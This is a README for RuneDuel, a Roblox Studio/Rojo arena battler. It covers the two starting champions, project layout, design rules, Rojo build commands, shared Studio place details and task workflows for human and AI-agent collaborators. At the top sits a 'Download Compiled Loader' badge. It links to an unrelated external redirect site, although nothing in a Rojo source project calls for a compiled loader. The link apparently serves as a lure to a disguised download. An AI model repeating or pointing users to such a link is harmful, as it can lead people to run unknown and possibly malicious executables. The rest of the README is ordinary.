# RuneDuel

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

RuneDuel is a Roblox Studio / Rojo arena battler built for short, readable, skill-based matches. The game starts with `1v1` and expands to `2v2` and `3v3` once the combat loop is stable.

The first two champions are:

- `Ember`: ranged fire mage built around poke, burst, Heat, and spacing.
- `Terra`: melee earth bruiser built around gap closing, pressure, Stoneguard, and disruption.

The first playable milestone is a `1v1` greybox arena where two players can choose Ember or Terra, move with `WASD`, aim with the mouse, use a small base kit, take server-authoritative damage, finish a best-of-3 round set, and unlock an early champion mastery reward.

## Repository

- Intended GitHub repo: `https://github.com/jeffsyp/runeduel-roblox`
- Roblox project sync: Rojo via `default.project.json`
- Pinned local Rojo tool: `aftman.toml`
- Source root: `src/`
- Planning source of truth: `docs/goals/prepare-runeduel-repo.md`
- Reference notes: `docs/reference/stealth-roblox-reference.md`
- Execution backlog: `TASKS.md`
- Task claim ledger: `WORK_STATUS.md`
- Collaborator workflow: `COLLABORATION.md`
- Studio/Rojo dev-place workflow: `docs/testing/dev-place-workflow.md`

## Core Rules

- No paid combat power.
- Progression unlocks sidegrades, not stronger stats.
- Ranked rewards are earned only.
- Server owns damage, health, cooldown validation, round state, rewards, ranked data, and progression grants.
- Client owns input, camera, UI, aiming previews, VFX, SFX, and local feel.
- Long `/goal` prompts live in repo files under `docs/goals/`.

## First Build Target

The first implementation goal after setup should be Phase 1 from `TASKS.md`: greybox arena plus camera/input prototype. Gameplay systems should be added only through the scoped task goals in `docs/goals/tasks/`.

## Local Rojo Setup

Install Aftman, trust the pinned Rojo tool, and build the place file:

```bash
brew install aftman
aftman trust rojo-rbx/rojo
aftman install
export PATH="$HOME/.aftman/bin:$PATH"
mkdir -p build
rojo build default.project.json --output build/runeduel.rbxlx
```

Detailed setup and validation notes live in `docs/testing/rojo-workflow.md`.

## Roblox Studio Place

The development experience is `RuneDuel`.

- Place URL: https://www.roblox.com/games/130607582149041/RuneDuel
- Place id: `130607582149041`
- Universe id: `10183567096`
- Owner: `RuneDuel` Roblox community/group

The group-owned `RuneDuel` place is the shared integration target. It must stay private or team-restricted until launch readiness. Team Create is enabled on the confirmed RuneDuel development place, and collaborators should be added through Roblox permissions or group roles.

Feature-branch work should use a personal dev place or a local `build/runeduel.rbxlx` file for Rojo live sync and Studio Play. Do not point multiple workers at the same shared Studio place for live sync.

Current place-link status lives in `docs/testing/studio-place-link.md`.
The multi-collaborator Studio sync workflow lives in `docs/testing/dev-place-workflow.md`.
The live publish workflow lives in `docs/testing/live-publish-workflow.md`.

Player-visible changes are not live just because the branch is pushed or the PR is merged. After changes land on `main`, publish the relevant Roblox places from clean latest `main` and record publish evidence.

## Working With AI Agents

Every agent must read `AGENTS.md`, `AI_WORKFLOW.md`, `DECISIONS.md`, and its assigned task goal file before editing. Each task has an allowed file list, forbidden file list, branch name, acceptance criteria, verification commands, commit message, push instructions, and PR template.

## Working With Collaborators

Human collaborators use their own GitHub accounts, their own commit identity, one task branch at a time, and pull requests into protected `main`. Start with `COLLABORATION.md` and `CONTRIBUTING.md` before taking a task.

Before implementation, claim the task in `WORK_STATUS.md` and merge that claim to `main` first.

For Studio validation, use your own personal dev place by default. The shared group-owned `RuneDuel` place is for latest-`main` integration and publishing, not normal feature-branch Rojo sync.

To let an AI choose a task automatically, use:

```text
/goal Follow docs/goals/claim-next-available-task.md exactly. Claim the next available task, then follow that task's own goal file to completion.
```

To let one AI agent keep working sequentially, use:

```text
/goal Follow docs/goals/run-next-available-task-loop.md exactly. Keep claiming and completing the next available task until no safe task remains, then stop.
```
